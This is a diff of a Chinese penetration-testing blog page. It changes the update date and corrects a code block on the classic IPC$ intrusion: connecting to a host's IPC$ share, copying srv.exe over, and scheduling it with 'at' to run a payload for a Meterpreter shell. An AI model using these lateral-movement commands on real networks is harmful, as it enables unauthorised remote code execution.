@@ -224,7 +224,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：2021年9月24日 下午
+                  本文最后更新于：2022年1月3日 晚上
                 
               </p>
             
@@ -450,7 +450,7 @@
 <p>通过上面的分析，我们先选择最简单的方法，输入net view命令，在列举的机器名里选择一个和我们机器名相似的服务器来试试，不出意外的话，成功率很高</p>
 <p>此处温习经典IPC$入侵</p>
 <p>IPC$入侵：即通过使用Windows 系统中默认启动的IPC$共享获得计算机控制权的入侵，在内网中极其常见<br>假设现在有一台IPC$主机:127.0.0.25，输入以下命令</p>
-<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">net use \127.0.0.25Vipc$ <span class="hljs-comment">#连接127.0.0.25的IPC$共享</span><br>copy srv.exe \127.0.0.25\ipc$ <span class="hljs-comment">#复制srv.exe到目标主机</span><br>net time \127.0.0.25 <span class="hljs-comment">#查时间</span><br>at \127.0.0.25 10: 50 srv.exe <span class="hljs-comment">#用at命令在10点50分启动srv.exe (注意这里设置的时间要比主机时间快)</span><br></code></pre></div></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">net use \127.0.0.25\ipc$ <span class="hljs-comment">#连接127.0.0.25的IPC$共享</span><br>copy srv.exe \127.0.0.25\ipc$ <span class="hljs-comment">#复制srv.exe到目标主机</span><br>net time \127.0.0.25 <span class="hljs-comment">#查时间</span><br>at \127.0.0.25 10: 50 srv.exe <span class="hljs-comment">#用at命令在10点50分启动srv.exe (注意这里设置的时间要比主机时间快)</span><br></code></pre></div></td></tr></table></figure>
 
 <p>at是让机器在指定时间做指定的事情的命令</p>
 <p>这里将payload上传到服务器，at启动，获取对应的Meterpreter Shell</p>
